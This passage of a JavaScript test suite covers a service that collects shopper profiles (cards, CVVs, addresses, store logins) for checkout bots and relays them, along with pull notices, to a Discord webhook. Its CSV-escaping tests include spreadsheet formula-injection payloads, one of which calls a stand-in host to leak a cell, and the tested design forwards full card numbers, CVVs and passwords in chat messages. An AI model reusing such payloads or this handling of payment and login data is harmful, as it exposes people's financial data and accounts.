  await test("admin lists keys (with review links) and submissions, never the codes", async () => {
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.keys.length, 3);
    assert.ok(d.keys.every((k) => k.review_url.includes("/submit/review/") && k.review_token === undefined && k.key_hash === undefined));
    assert.equal(d.submissions.length, 33);
    assert.ok(d.submissions.every((x) => x.code === undefined && x.bytes > 0));
  });

  console.log("\nPulls");
  const pull = (key, body) => slots("/pull", key, body);
  const sentOn = Date.parse("2026-09-26T15:00:00Z");
  const two = [
    { store: "Target", profile: "Kim   Lee", email: "kim_lee@example.com", card: "Visa 4242", sentAt: sentOn },
    { store: "Best Buy", profile: "Sam\nPark", email: "", card: "Amex 1005", sentAt: sentOn - 86400000 },
  ];
  let pullBatch;
  await test("pulls need a license", async () => {
    assert.equal((await pull(null, { keyId: ownerKey.keyId, slots: two })).status, 401);
    const r = await pull("PVLT-AAAA-BBBB-CCCC-DDDD", { keyId: ownerKey.keyId, slots: two });
    assert.equal(r.status, 401); assert.deepEqual(await r.json(), { error: "license not recognized" });
  });
  await test("a pull for a key this license never sent slots to isn't posted", async () => {
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(frankKey, { keyId: otherKey.keyId, name: "Frank", slots: two })).json(), { ok: true, forwarded: false });
    assert.deepEqual(await (await pull(frankKey, { keyId: "ABCD-1234", slots: two })).json(), { ok: true, forwarded: false });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("pulling sent slots posts them to the channel as a plain list", async () => {
    pullBatch = "pull" + rid();
    const before = webhookPosts.length;
    const r = await pull(frankKey, { keyId: ownerKey.keyId.toLowerCase(), name: "Frank *F*", batch: pullBatch, slots: two });
    assert.equal(r.status, 200);
    assert.deepEqual(await r.json(), { ok: true, forwarded: true, id: pullBatch });
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`🔻 **2 slots pulled** by **Frank \\*F\\*** · @frank · license …${frankKey.slice(-4)}\n`), m.content);
    assert.ok(m.content.includes("\nTarget · Kim Lee · kim\\_lee@example.com · Visa 4242 · sent 2026-09-26\n"), "email is markdown-escaped");
    assert.ok(m.content.includes("\nBest Buy · Sam Park · Amex 1005 · sent 2026-09-25\n"), "empty parts are left out");
    assert.ok(m.content.endsWith(`\n-# Take them off their list. Sent for key ${ownerKey.keyId}.`));
    assert.equal(m.files.length, 0); assert.equal(m.flags, 4); assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("sending the same pull again (its answer got lost) doesn't post it twice", async () => {
    const before = webhookPosts.length;
    const again = await pull(frankKey, { keyId: ownerKey.keyId, batch: pullBatch, slots: two });
    assert.deepEqual(await again.json(), { ok: true, forwarded: true, duplicate: true, id: pullBatch });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("another license can't reuse a pull's batch id", async () => {
    const r = await pull(GH_KEY, { keyId: ownerKey.keyId, batch: pullBatch, slots: two });
    assert.equal(r.status, 409); assert.deepEqual(await r.json(), { error: "batch id taken" });
  });
  await test("one slot pulled", async () => {
    const r = await (await pull(frankKey, { keyId: ownerKey.keyId, slots: [{ store: "Walmart", profile: "Solo", sentAt: "yesterday" }] })).json();
    assert.equal(r.forwarded, true);
    const m = webhookPosts.at(-1).content;
    assert.ok(m.startsWith(`🔻 **1 slot pulled** by @frank · license …${frankKey.slice(-4)}\n`), m);
    assert.ok(m.includes("\nWalmart · Solo\n"), "a sentAt that isn't a time is left off");
    assert.match(m, /Take it off their list\./);
  });
  await test("pulls need a key ID and at least one slot with a store or profile", async () => {
    for (const body of [
      { keyId: ownerKey.keyId, slots: [] },
      { keyId: ownerKey.keyId },
      { keyId: ownerKey.keyId, slots: [{ email: "a@b.c", card: "Visa 1111" }, null, "x"] },
      { keyId: ownerKey.keyId, slots: Array.from({ length: 501 }, () => ({ store: "Target" })) },
      { keyId: "nope", slots: two },
      { keyId: ownerKey.keyId + "0", slots: two },
      { slots: two },
    ]) assert.equal((await pull(frankKey, body)).status, 400, JSON.stringify(body).slice(0, 80));
    assert.equal((await pull(frankKey, { keyId: ownerKey.keyId, slots: two, pad: "x".repeat(210000) })).status, 413);
  });
  await test("a long pull is attached as a file, with counts per store in the message", async () => {
    const many = Array.from({ length: 60 }, (_, i) => ({
      store: i % 2 ? "Walmart" : "Target", profile: `Profile ${i} ` + "with a very long name ".repeat(5),
      email: `shopper_${i}@example.com`, card: "Mastercard 5454", sentAt: sentOn,
    }));
    const before = webhookPosts.length;
    const r = await (await pull(frankKey, { keyId: ownerKey.keyId, name: "Frank *F*", slots: many })).json();
    assert.equal(r.forwarded, true);
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.length <= 2000, "fits in one Discord message: " + m.content.length);
    assert.match(m.content, /^🔻 \*\*60 slots pulled\*\* by \*\*Frank/);
    assert.match(m.content, /\nTarget 30 · Walmart 30\n/);
    assert.ok(m.content.endsWith(`\n-# The full list is attached. Take them off their list. Sent for key ${ownerKey.keyId}.`));
    assert.doesNotMatch(m.content, /Profile 0/, "the list itself is only in the file");
    assert.equal(m.files.length, 1);
    assert.match(m.files[0].name, /^orbit-pulled-\d{4}-\d\d-\d\d-\d{4}-Frank-F\.txt$/);
    const clip = (s, n) => s.replace(/\s+/g, " ").trim().slice(0, n);
    assert.deepEqual(m.files[0].text.trim().split("\n"),
      many.map((x) => `${x.store} | ${clip(x.profile, 80)} | ${x.email} | Mastercard 5454 | sent 2026-09-26`), "every slot, not markdown-escaped");
  });
  await test("if the channel refuses a pull, the app is told and sending it again posts it", async () => {
    webhookFail.push(500);
    const batch = "pullfail" + rid();
    const r = await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two });
    assert.equal(r.status, 502); assert.deepEqual(await r.json(), { error: "couldn't post to the channel" });
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a pull still posts when the app hangs up mid-post, and its retry isn't posted again", async () => {
    const batch = "pullhang" + rid(), before = webhookPosts.length;
    webhookHang = { ms: 1500 };
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 300);
    await assert.rejects(fetch(BASE + "/pull", { method: "POST", signal: ac.signal, headers: { authorization: "Bearer " + frankKey, "content-type": "application/json" },
      body: JSON.stringify({ keyId: ownerKey.keyId, batch, slots: two }) }));
    await new Promise((ok) => setTimeout(ok, 2500));
    assert.equal(webhookPosts.length, before + 1, "posted after the app hung up");
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, duplicate: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a pull still unposted after PULL_STALE_MS is taken over by a retry, and the first attempt failing late doesn't undo it", async () => {
    // The first attempt's post hangs for 6 s and then fails; the app gave up on it long before.
    const batch = "stuck" + rid(), before = webhookPosts.length, t0 = Date.now();
    webhookHang = { ms: 6000, code: 500 };
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 300);
    await assert.rejects(fetch(BASE + "/pull", { method: "POST", signal: ac.signal, headers: { authorization: "Bearer " + frankKey, "content-type": "application/json" },
      body: JSON.stringify({ keyId: ownerKey.keyId, batch, slots: two }) }));
    const r = await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two });
    assert.equal(r.status, 425, "a recent attempt may still be posting"); assert.deepEqual(await r.json(), { error: "still sending" });
    await new Promise((ok) => setTimeout(ok, Math.max(0, t0 + 3600 - Date.now())));
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
    await new Promise((ok) => setTimeout(ok, Math.max(0, t0 + 7500 - Date.now())));   // the first attempt has failed by now
    assert.deepEqual(await (await pull(frankKey, { keyId: ownerKey.keyId, batch, slots: two })).json(), { ok: true, forwarded: true, duplicate: true, id: batch });
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("at most 30 pulls an hour per license", async () => {
    const one = [{ store: "Target", profile: "Kim" }];
    for (let i = 0; i < 30; i++) assert.equal((await (await pull(GH_KEY, { keyId: ownerKey.keyId, slots: one })).json()).forwarded, true);
    const r = await pull(GH_KEY, { keyId: ownerKey.keyId, slots: one });
    assert.equal(r.status, 429); assert.deepEqual(await r.json(), { error: "too many pulls this hour" });
    assert.equal((await (await pull(frankKey, { keyId: ownerKey.keyId, slots: one })).json()).forwarded, true, "other licenses can still pull");
  });
  await test("admin lists pulls, without what was in them", async () => {
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.pulls.length, 37);
    assert.deepEqual(Object.keys(d.pulls[0]).sort(), ["created_at", "id", "key_id", "key_last4", "name", "slots", "username"]);
    const p = d.pulls.find((x) => x.id === pullBatch);
    assert.deepEqual([p.slots, p.name, p.username, p.key_id], [2, "Frank *F*", "frank", ownerKey.keyId]);
  });

  console.log("\nCSV submissions (app 1.9.52+)");
  const csv = "profile_name,group,email,card_number,card_cvv,target_account_email,target_account_password\r\n" +
    'Kim Lee,Beta,kim@example.com,4242424242424242,123,kim.target@example.com,"pa,ss""word"\r\n' +
    "Sam Park,Main,sam@example.com,5454545454545454,456,,\r\n";
  let csvBatch;
  await test("a CSV batch is posted as a .csv file, and needs no collecting key", async () => {
    await keyPost(ownerLink, "deny");
    assert.equal((await getJson("/submit/key")).pub, null);
    csvBatch = "csv" + rid();
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { csv, name: "Beta", slots: 2, stores: [{ name: "Target", n: 2 }], batch: csvBatch });
    assert.equal(r.status, 200); assert.deepEqual(await r.json(), { ok: true, id: csvBatch, review: "pending" });
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`📦 **2 slots** from **Beta** · @frank · license …${frankKey.slice(-4)}\nTarget 2\n`), m.content);
    assert.match(m.content, new RegExp(`\\n-# CSV attached\\.\\n⏳ \\*\\*Pending your approval\\*\\* · \\[Approve or decline\\]\\(${BASE}/submissions/review/${csvBatch}\\?t=[A-Za-z0-9_-]{32}\\)$`), m.content);
    assert.equal(m.files.length, 1); assert.deepEqual(asShown(m.files[0].text), csvRows(csv), "the CSV as sent, as Excel shows it");
    assert.equal(m.files[0].text.split("\r\n")[1], 'Kim Lee,Beta,kim@example.com,"=""4242424242424242""","=""123""",kim.target@example.com,"pa,ss""word"', "card number and CVV as Excel text");
    assert.ok(m.files[0].text.endsWith("\r\n"), "ends as it did");
    assert.match(m.files[0].name, /^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-Beta\.csv$/);
    assert.match(m.files[0].type, /^text\/csv/);
    assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("sending the same CSV batch again doesn't post it twice", async () => {
    const before = webhookPosts.length;
    const again = await (await slots("/submissions", frankKey, { csv, name: "Beta", slots: 2, batch: csvBatch })).json();
    assert.equal(again.ok, true); assert.equal(again.duplicate, true);
    assert.equal(webhookPosts.length, before);
  });
  await test("a CSV batch needs a license, Orbit's CSV header and a slot count, and has a size limit", async () => {
    assert.equal((await slots("/submissions", null, { csv, slots: 2 })).status, 401);
    for (const body of [
      { csv: "", slots: 1 },
      { csv: "name,email\r\nKim,kim@example.com\r\n", slots: 1 },
      { csv: "\r\n" + csv, slots: 1 },
      { csv, slots: 0 },
      { csv: 42, slots: 1 },
    ]) assert.equal((await slots("/submissions", frankKey, body)).status, 400, JSON.stringify(body).slice(0, 60));
    assert.equal((await slots("/submissions", frankKey, { csv: "\uFEFF" + csv, slots: 2 })).status, 200, "a byte-order mark is fine");
    assert.equal((await slots("/submissions", frankKey, { csv: csv + "x".repeat(4_050_000), slots: 2 })).status, 413);
  });
  await test("pulling slots that were sent as CSV posts them, and says so", async () => {
    const before = webhookPosts.length;
    const r = await (await pull(frankKey, { keyId: "csv", name: "Beta", slots: two })).json();
    assert.equal(r.forwarded, true);
    assert.equal(webhookPosts.length, before + 1);
    assert.ok(webhookPosts.at(-1).content.endsWith("\n-# Take them off their list. Sent as CSV."), webhookPosts.at(-1).content);
    assert.doesNotMatch(webhookPosts.at(-1).content, /4242424242424242/, "never the card number");
  });
  await test("a CSV pull from a license that never sent a CSV batch isn't posted", async () => {
    const before = webhookPosts.length;
    assert.deepEqual(await (await pull(GH_KEY, { keyId: "CSV", slots: two })).json(), { ok: true, forwarded: false });
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("admin lists CSV batches as key CSV, never the CSV itself", async () => {
    const d = await (await admin("/admin/submissions")).json();
    const s = d.submissions.find((x) => x.id === csvBatch);
    assert.equal(s.key_id, "CSV"); assert.equal(s.slots, 2); assert.equal(s.bytes, csv.length);
    assert.ok(d.submissions.every((x) => x.csv === undefined && x.code === undefined));
  });
  await test("slots asking the owner to assign an account are counted on their store's line (app 1.9.53+)", async () => {
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { csv, name: "Beta", slots: 9, stores: [
      { name: "Target", n: 3, seller: 2 }, { name: "Walmart", n: 1, seller: 1 }, { name: "Best Buy", n: 1, seller: 0 },
      { name: "Costco", n: 2, seller: 9 }, { name: "Nike", n: 1, seller: -3 }, { name: "Topps", n: 1, seller: "x" }] });
    assert.equal(r.status, 200);
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content,
      /\nTarget 3 \(2 need an account\) · Walmart 1 \(1 needs an account\) · Best Buy 1 · Costco 2 \(2 need an account\) · Nike 1 · Topps 1\n/,
      "counted, capped at the store's slots, and left off when there are none or it isn't a number");
  });
  console.log("\nPer-store files (app 1.9.53+)");
  const tgtCsv = "profile_name,first_name,last_name,email,phone_num,cc_number,cc_exp_month,cc_exp_year,cc_cvv,shipping_street,shipping_street_2,shipping_city,shipping_state,shipping_zip_code,shipping_country,billing_first_name,billing_last_name,billing_street,billing_street_2,billing_city,billing_state,billing_zip_code,billing_country\r\n" +
    "Kim Lee,Kim,Lee,kim@example.com,5550100,4242424242424242,07,2029,123,1 Main St,,Austin,TX,78701,US,Kim,Lee,1 Main St,,Austin,TX,78701,US";
  const wmCsv = tgtCsv.replace("Kim Lee,Kim,Lee", "Sam Park,Sam,Park");
  // The same row as Shikari writes it: the month without its leading 0, CRLF after every line (2026-10-09).
  const kimShikari = tgtCsv.split("\r\n")[0] + "\r\nKim Lee,Kim,Lee,kim@example.com,5550100,4242424242424242,7,2029,123,1 Main St,,Austin,TX,78701,US,Kim,Lee,1 Main St,,Austin,TX,78701,US\r\n";
  await test("a batch comes as an AYCD list and a Shikari CSV per store, with its logins in a .txt, named by buyer and store (2026-10-09)", async () => {
    const before = webhookPosts.length;
    const files = [
      { store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: "kim.target@example.com:pa:ss" },
      { store: "Walmart", kind: "profiles", text: wmCsv }, { store: "Pokémon Center", kind: "profiles", text: tgtCsv }];
    const r = await slots("/submissions", frankKey, { files, name: "Beta", slots: 3, batch: "files" + rid(),
      stores: [{ name: "Target", n: 1 }, { name: "Walmart", n: 1, seller: 1 }, { name: "Pokémon Center", n: 1 }] });
    assert.equal(r.status, 200);
    assert.equal(webhookPosts.length, before + 1, "one message");
    const m = webhookPosts.at(-1);
    assert.ok(m.content.startsWith(`📦 **3 slots** from **Beta** · @frank · license …${frankKey.slice(-4)}\nTarget 1 · Walmart 1 (1 needs an account) · Pokémon Center 1\n`), m.content);
    assert.ok(m.content.includes("\n-# Per store: its profiles for AYCD (.json) and Shikari (.csv), with its logins (email:password, .txt) in the same order (none for Pokémon Center). Profiles that need an account come last.\n⏳ **Pending your approval** · [Approve or decline]("), m.content);
    assert.deepEqual(m.files.map((f) => f.name), ["Beta-target-aycd.json", "Beta-target-shikari.csv", "Beta-target-logins.txt",
      "Beta-walmart-aycd.json", "Beta-walmart-shikari.csv", "Beta-pokemon-center-aycd.json", "Beta-pokemon-center-shikari.csv"]);
    assert.deepEqual(shikariOf(m).map((f) => f.text), [kimShikari, kimShikari.replace("Kim Lee,Kim,Lee", "Sam Park,Sam,Park"), kimShikari], "each store's rows as Shikari writes them");
    assert.ok(shikariOf(m).every((f) => /^text\/csv/.test(f.type)), "as CSV files");
    assert.deepEqual(aycdOf(m).map((l) => l.map((x) => x.name)), [["Kim Lee"], ["Sam Park"], ["Kim Lee"]], "each store's rows as AYCD profiles");
    assert.deepEqual(plain(m).map((f) => f.text), [files[1].text], "the logins file exactly as sent");
    assert.match(plain(m)[0].type, /^text\/plain/); assert.match(m.files[0].type, /^application\/json/);
  });
  await test("Pokémon Center's slots go out as their AYCD list and Shikari CSV, never a logins file (2026-10-07)", async () => {
    // An older app (no storeKey) or older data can still send one; the email is on each AYCD profile.
    for (const pc of [{ store: "Pokémon Center", storeKey: "pokemoncenter" }, { store: "Pokemon Center" }]) {
      const before = webhookPosts.length;
      const files = [
        { store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: "kim.target@example.com:pa:ss" },
        { ...pc, kind: "profiles", text: wmCsv }, { store: pc.store, kind: "logins", text: "sam.pc@example.com:Inbox-Pw-9!" }];
      assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 2, batch: "pcl" + rid(), stores: [{ name: "Target", n: 1 }, { name: pc.store, n: 1 }] })).status, 200);
      const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦"));
      assert.deepEqual(m.files.map((f) => f.name),
        ["Beta-target-aycd.json", "Beta-target-shikari.csv", "Beta-target-logins.txt", "Beta-pokemon-center-aycd.json", "Beta-pokemon-center-shikari.csv"], pc.store);
      assert.ok(!m.files.some((f) => /Inbox-Pw-9/.test(f.text)), "its password goes nowhere");
      assert.ok(m.content.includes("with its logins (email:password, .txt) in the same order (none for Pokémon Center)."), m.content);
    }
    // A batch of only Pokémon Center: no logins file, and the message doesn't mention one.
    const before = webhookPosts.length;
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Pokémon Center", storeKey: "pokemoncenter", kind: "profiles", text: wmCsv },
      { store: "Pokémon Center", kind: "logins", text: "sam.pc@example.com:Inbox-Pw-9!" }], name: "Beta", slots: 1, batch: "pcl" + rid(), stores: [{ name: "Pokémon Center", n: 1 }] })).status, 200);
    const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦"));
    assert.deepEqual(m.files.map((f) => f.name), ["Beta-pokemon-center-aycd.json", "Beta-pokemon-center-shikari.csv"]);
    assert.ok(m.content.includes("\n-# Per store: its profiles for AYCD (.json) and Shikari (.csv).\n"), m.content);
  });
  const slotHead = tgtCsv.split("\r\n")[0];
  await test("the Shikari CSV is written as Shikari writes it: plain values, codes, the phone's 10 digits, CRLF (2026-10-09)", async () => {
    const rows = [
      ["Lâm #1", "Lâm", "Nguyễn", "lam@example.com", "+1 (555) 010-0199", "4242 4242 4242 4242", "09", "31", "053", "12 Oak St, Apt 4", "", "St. Louis", "Missouri", "63101", "United States",
        "Lâm", "Nguyễn", "12 Oak St, Apt 4", "", "St. Louis", "mo", "63101", "usa"],
      ["Lou Ng", "Lou", "Ng", "lou@example.com", "555-010-0101", "5555555555554444", "1", "2030", "321", "9 Elm St", "Apt 2", "Toronto", "ON", "M5V 2T6", "CA",
        "Lou", "Ng", "1 Bay St", "", "Toronto", "Ontario", "M5J 2N8", "Canada"],
      ['=HYPERLINK("http://evil.example/")', "Ann", "One", "ann@example.com", "5550100", "4111111111111111", "12", "2029", "007", "-1 Main St", "", "@Austin", "TX", "78701", "",
        "Ann", "One", "+1 Main St", "", "Austin", "TX", "78701", "US"],
    ];
    const text = slotHead + "\r\n" + rows.map((r) => r.map(cellT).join(",")).join("\r\n");
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Target", storeKey: "target", kind: "profiles", text }], name: "Lâm Nguyễn", slots: 3, batch: "sk" + rid() })).status, 200);
    const m = webhookPosts.at(-1);
    assert.deepEqual(m.files.map((f) => f.name), ["Lam-Nguyen-target-aycd.json", "Lam-Nguyen-target-shikari.csv"], "named after the buyer, with the accents taken off");
    assert.equal(shikariOf(m)[0].text, [slotHead,
      'Lâm #1,Lâm,Nguyễn,lam@example.com,5550100199,4242424242424242,9,2031,053,"12 Oak St, Apt 4",,St. Louis,MO,63101,US,Lâm,Nguyễn,"12 Oak St, Apt 4",,St. Louis,MO,63101,US',
      "Lou Ng,Lou,Ng,lou@example.com,5550100101,5555555555554444,1,2030,321,9 Elm St,Apt 2,Toronto,ON,M5V 2T6,CA,Lou,Ng,1 Bay St,,Toronto,ON,M5J 2N8,CA",
      '"HYPERLINK(""http://evil.example/"")",Ann,One,ann@example.com,5550100,4111111111111111,12,2029,007,1 Main St,,Austin,TX,78701,US,Ann,One,1 Main St,,Austin,TX,78701,US',
    ].join("\r\n") + "\r\n");
    for (const v of csvRows(shikariOf(m)[0].text).flat()) assert.ok(!/^[=+\-@]/.test(v), "nothing a spreadsheet would run: " + v);
    // No name sent: the buyer's Discord name.
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: tgtCsv }], slots: 1, batch: "sk" + rid() })).status, 200);
    assert.deepEqual(webhookPosts.at(-1).files.map((f) => f.name), ["frank-target-aycd.json", "frank-target-shikari.csv"]);
  });
  await test("number cells in a posted CSV (app 1.9.52's) go out as Excel text, so the full card number and leading zeros show", async () => {
    const sent = slotHead + "\r\nAnn One,Ann,One,ann@example.com,+15550100,5555555555554444,09,2031,053,1 Main St,,Boston,MA,02139,US,Ann,One,1 Main St,,Boston,MA,02139,US";
    const r = await slots("/submissions", frankKey, { csv: sent, name: "Beta", slots: 1, batch: "xl" + rid() });
    assert.equal(r.status, 200);
    const got = plain(webhookPosts.at(-1))[0].text.split("\r\n");
    assert.equal(got[0], slotHead, "the header as sent");
    assert.equal(got[1], 'Ann One,Ann,One,ann@example.com,"=""+15550100""","=""5555555555554444""","=""09""",2031,"=""053""",1 Main St,,Boston,MA,"=""02139""",US,Ann,One,1 Main St,,Boston,MA,"=""02139""",US');
  });
  await test("a buyer's cell that starts with = + - or @ goes out as text, never as a formula", async () => {
    const evil = '=HYPERLINK("http://evil.example/?"&F2,"Click")', long = "=" + "x".repeat(600);
    const row = [evil, "Ann", "One", "ann@example.com", "5550100", "4242424242424242", "07", "2029", "123", "+1 Main St", "-", "@home", "TX", "78701", "US", "Ann", "One", long, "", "Austin", "TX", "78701", "US"];
    const r = await slots("/submissions", frankKey, { csv: slotHead + "\r\n" + row.map(cellT).join(","), name: "Beta", slots: 1, batch: "xl" + rid() });
    assert.equal(r.status, 200);
    const posted = csvRows(plain(webhookPosts.at(-1))[0].text)[1];
    assert.equal(posted[0], '="=HYPERLINK(""http://evil.example/?""&F2,""Click"")"');
    assert.deepEqual([posted[9], posted[10], posted[11]], ['="+1 Main St"', '="-"', '="@home"']);
    assert.match(posted[17], /^="=x{249}"&"x{250}"&"x{101}"$/, "a long one in parts of 250 at most, which Excel takes");
    assert.deepEqual(posted.map(shown), row, "Excel shows exactly what was typed");
    for (const v of posted) assert.ok(!/^[=+\-@]/.test(v) || EXCEL_STRINGS.test(v), "nothing that runs but plain strings: " + v);
  });
  const kimPlace = { name: "Kim Lee", email: "kim@example.com", phone: "5550100", line1: "1 Main St", line2: "", line3: "", postCode: "78701", city: "Austin", country: "United States", state: "Texas" };
  const kimAycd = { name: "Kim Lee", notes: "", billingAddress: kimPlace, shippingAddress: kimPlace,
    paymentDetails: { nameOnCard: "Kim Lee", cardType: "Visa", cardNumber: "4242424242424242", cardExpMonth: "07", cardExpYear: "2029", cardCvv: "123" },
    sameBillingAndShippingAddress: true, onlyCheckoutOnce: false, matchNameOnCardAndAddress: true };
  await test("each store's slots also go out as AYCD JSON, as AYCD exports it, made from the CSV for apps before 1.9.87", async () => {
    const files = [{ store: "Target", kind: "profiles", text: tgtCsv }, { store: "Walmart", kind: "profiles", text: wmCsv }];
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 2, batch: "ay" + rid() })).status, 200);
    const m = webhookPosts.at(-1), [tgt, wm] = aycdOf(m);
    assert.equal(JSON.stringify(tgt), JSON.stringify([kimAycd]), "AYCD's keys in AYCD's order, the state and country written out");
    assert.equal(m.files[0].text, JSON.stringify([kimAycd], null, 2), "indented as AYCD writes it");
    assert.deepEqual([wm[0].name, wm[0].shippingAddress.name, wm[0].billingAddress.name, wm[0].paymentDetails.nameOnCard, wm[0].sameBillingAndShippingAddress],
      ["Sam Park", "Sam Park", "Kim Lee", "Kim Lee", false], "the billing name (this row's is Kim Lee) as the name on card");
  });
  await test("billing somewhere else, Canada, Mastercard and Amex, written out as AYCD does", async () => {
    const lou = ["Lou Ng", "Lou", "Ng", "lou@example.com", "5550101", "5555555555554444", "01", "2030", "321", "9 Elm St", "Apt 2", "Toronto", "ON", "M5V 2T6", "CA", "Lou", "Ng", "1 Bay St", "", "Toronto", "ON", "M5J 2N8", "CA"];
    const amy = ["Amy Ax", "Amy", "Ax", "amy@example.com", "5550102", "378282246310005", "11", "2031", "1234", "5 Oak Rd", "", "Reno", "NV", "89501", "US", "Amy", "Ax", "5 Oak Rd", "", "Reno", "NV", "89501", "US"];
    const text = slotHead + "\r\n" + [lou, amy].map((r) => r.map(cellT).join(",")).join("\r\n");
    assert.equal((await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text }], name: "Beta", slots: 2, batch: "ay" + rid() })).status, 200);
    const [[l, a]] = aycdOf(webhookPosts.at(-1));
    assert.deepEqual([l.sameBillingAndShippingAddress, l.shippingAddress.line2, l.shippingAddress.state, l.shippingAddress.country, l.billingAddress.line1, l.billingAddress.postCode],
      [false, "Apt 2", "Ontario", "Canada", "1 Bay St", "M5J 2N8"]);
    assert.deepEqual([l.paymentDetails.cardType, a.paymentDetails.cardType, a.paymentDetails.cardCvv, a.sameBillingAndShippingAddress, a.shippingAddress.state], ["MasterCard", "Amex", "1234", true, "Nevada"]);
  });
  await test("the app's own AYCD list (1.9.87+) goes out as sent, just before its store's logins", async () => {
    const mine = [{ ...kimAycd, paymentDetails: { ...kimAycd.paymentDetails, nameOnCard: "Kim Q Lee" }, onlyCheckoutOnce: true, matchNameOnCardAndAddress: false }];
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: tgtCsv }, { store: "Target", storeKey: "target", kind: "aycd", text: JSON.stringify(mine) },
      { store: "Target", storeKey: "target", kind: "logins", text: "kim.target@example.com:pw" }];
    assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 1, batch: "ay" + rid() })).status, 200);
    const m = webhookPosts.at(-1);
    assert.deepEqual(m.files.map((f) => f.name), ["Beta-target-aycd.json", "Beta-target-shikari.csv", "Beta-target-logins.txt"]);
    assert.equal(m.files[0].text, JSON.stringify(mine, null, 2));
  });
  await test("an AYCD list has to go with its store's CSV, one profile for each row", async () => {
    const tgt = { store: "Target", storeKey: "target", kind: "profiles", text: tgtCsv }, one = JSON.stringify([kimAycd]);
    const ay = (text, extra = {}) => ({ store: "Target", storeKey: "target", kind: "aycd", text, ...extra });
    for (const files of [
      [tgt, ay("[]")], [tgt, ay(JSON.stringify([kimAycd, kimAycd]))], [tgt, ay("{}")], [tgt, ay("not json")], [tgt, ay("[1]")], [tgt, ay("[[]]")],
      [tgt, ay(one), ay(one)], [tgt, ay(one, { store: "Walmart", storeKey: "walmart" })], [tgt, ay(one, { storeKey: "" })],
      [tgt, { ...tgt }, ay(one)],
    ]) assert.equal((await slots("/submissions", frankKey, { files, name: "Beta", slots: 1, batch: "ay" + rid() })).status, 400, JSON.stringify(files.map((f) => [f.kind, f.store, f.storeKey, f.text.slice(0, 12)])));
  });
  await test("per-store files need a store, a kind, some text, and at least one profiles CSV", async () => {
    for (const files of [
      [], [{ store: "Target", kind: "logins", text: "a@b.co:p" }],
      [{ store: "", kind: "profiles", text: tgtCsv }], [{ store: "Target", kind: "other", text: tgtCsv }],
      [{ store: "Target", kind: "profiles", text: "name,email\r\nKim,kim@example.com" }], [{ store: "Target", kind: "profiles", text: tgtCsv }, { store: "Target", kind: "logins", text: " " }],
      Array.from({ length: 61 }, (_, i) => ({ store: "Target " + i, kind: "profiles", text: tgtCsv })),
    ]) assert.equal((await slots("/submissions", frankKey, { files, slots: 1 })).status, 400, JSON.stringify(files).slice(0, 80));
  });
  await test("more than 10 files go out in follow-up messages", async () => {
    const before = webhookPosts.length;
    const files = [];
    for (let i = 0; i < 12; i++) files.push({ store: "Store " + i, kind: "profiles", text: tgtCsv }, { store: "Store " + i, kind: "logins", text: `a${i}@example.com:pw` });
    const r = await slots("/submissions", frankKey, { files, name: "Beta", slots: 12, batch: "many" + rid() });
    assert.equal(r.status, 200);
    const posts = webhookPosts.slice(before);
    assert.deepEqual(posts.map((m) => m.files.length), [10, 10, 10, 6], "three files a store: its AYCD list, its Shikari CSV and its logins");
    assert.ok(posts[0].content.startsWith("📦 **12 slots** from **Beta**"), posts[0].content);
    assert.equal(posts[1].content, `-# More files for the batch from **Beta** · @frank · license …${frankKey.slice(-4)} (11–20 of 36).`);
    assert.deepEqual(posts.flatMap((m) => plain(m).map((f) => f.text)), files.filter((f) => f.kind === "logins").map((f) => f.text), "every logins file, in order");
    assert.equal(posts.flatMap((m) => aycdOf(m)).length, 12, "and every store's AYCD list");
  });
  await test("if a follow-up message fails, the app is told, and sending again posts every file", async () => {
    const files = [];
    for (let i = 0; i < 6; i++) files.push({ store: "Shop " + i, kind: "profiles", text: tgtCsv }, { store: "Shop " + i, kind: "logins", text: `b${i}@example.com:pw` });
    const batch = "part" + rid(), before = webhookPosts.length;
